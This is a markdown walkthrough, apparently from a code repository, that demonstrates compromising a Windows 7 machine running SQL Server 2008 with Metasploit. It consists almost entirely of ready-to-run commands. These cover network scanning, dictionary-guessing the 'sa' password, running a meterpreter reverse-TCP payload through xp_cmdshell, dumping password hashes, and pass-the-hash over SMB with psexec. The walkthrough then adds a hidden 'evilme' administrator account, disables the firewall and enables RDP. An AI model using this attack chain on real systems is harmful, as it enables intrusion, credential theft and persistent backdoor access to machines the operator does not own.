#exploit-sqlserver-smb

This will demonstrate exploiting a poorly secured Microsoft SQL Server to gather password information. Then using the Pass-The-Hash technique, exploit a SMB vulnerability to gain control of a system. 

We are basing this attack on the premise that we are attacking a system with a poor or weak password such as a software engineers PC or a test Virtual Machine.

An attacker brute forcing their way into one weak subsystem, could potentially then gain control of the whole system without ever knowing the passwords of the accounts with the privileges to do so. 
This is the aim of a Pass-the-hash exploit. It is a means of using obtained password hashes to access systems without without ever knowing the password itself.

## Setup

### Attacker

Kali Linux on a bridged network

### Target

- Operating System: Windows 7 Professional. 
- SQL Server: Version: 2008 Enterprise
- SQL Server Setup
- Service Accounts: NT Authority\Local System


## The Exploit

All these steps are run on the Attacking Computer

###Scanning Phase. 

Find Target and examine MSSQL Information

``` bash

nmap -P0 -sS -A 192.168.192.36
nmap -sU -A 192.168.192.36 -p1433

```
To note if PC Name is default junk:

	- usually signifies a VM, 
	- probably no antivirus
	- Developers set them up and destroy them regularly and not subject to usualy policies.
	- Which is nice

Start Metaploit

Get more details about the SQL Server

``` bash 

use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 192.168.192.36
set THREADS 20
exploit

```

To note, PC Name is default junk, 
	usually signifies a VM, 
	probably no antivirus
	Developers set them up and destroy them regularly and not subject to usualy policies.
	Which is nice

###Attack Phase 

Dictionary attack on MSQL Credentials

``` bash 

use auxiliary/scanner/mssql/mssql_login
set RHOSTS 192.168.192.36
set RPORT 1433
set THREADS 20
set PASS_FILE /pentest/miniwordlist.txt
set USERNAME sa
exploit

```

####Establish a Reverse TCP Link with the victim

Microsoft SQL Server Payload Execution

This module executes an arbitrary payload on a Microsoft SQL Server by using the "xp_cmdshell" stored procedure. This method utilizes PowerShell to transmit and recreate the payload on the target. NOTE: This module will leave a payload executable on the target system when the attack is finished.

``` bash 

use exploit/windows/mssql/mssql_payload
show options
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST 192.168.192.36
set RPORT 1433
set USERNAME sa
set PASSWORD Password1
set LHOST 192.168.192.74
set LPORT 443
exploit

-- see who we are / currently have system privilages
use priv
getuid

-- get the hash dump
run post/windows/gather/hashdump

```

#### Pass The Hash

This module (exploit/windows/smb/psexec) will relay SMB authentication requests to another host, gaining access to an authenticated SMB session if successful. If the connecting user is an administrator and network logins are allowed to the target machine, this module will execute an arbitrary payload. PSExec will allow a password to be passed of a HASHED Password. To exploit this, the target system	must try to	authenticate to this module. The easiest way to force a SMB authentication attempt is by embedding a UNC path (\\SERVER\SHARE) 

Establish a link to the victim with administrator privilages

Use the Admin hash to have administrator privilages via the SMB exploit


``` bash

background
use exploit/windows/smb/psexec
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST 192.168.192.36
set LHOST 192.168.192.74
set SHARE C$
set SMBPass aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef
set SMBUser admin
exploit

-- Now open a shell
shell
```


#### Pawnage

-- Next Create a new admin account on the machine

``` bash

net user evilme evilme /add
net localgroup "Administrators" evilme /add


-- Allow Remote Access
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

-- Now RDP to hacked PC

You Win !

```


### References

[Metasploit with Microsoft SQL Server and SMB exploits (Part 1/2)](https://www.youtube.com/watch?v=hywLFAaKYEg)

[Metasploit with Microsoft SQL Server and SMB exploits (Part 2/2)](https://www.youtube.com/watch?v=OAsd4HtVZEw)

[MS08-068 Microsoft Windows SMB Relay Code Execution]
(http://www.rapid7.com/db/modules/exploit/windows/smb/smb_relay)

https://www.rapid7.com/db/modules/exploit/windows/smb/psexec

[Pass the Hash Attack](http://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283?show=pass-the-hash-attacks-tools-mitigation-33283&cat=testing)

[offensive-security](http://www.offensive-security.com/metasploit-unleashed/PSExec_Pass_The_Hash)

[Microsoft SQL Server Payload Execution](http://www.rapid7.com/db/modules/exploit/windows/mssql/mssql_payload)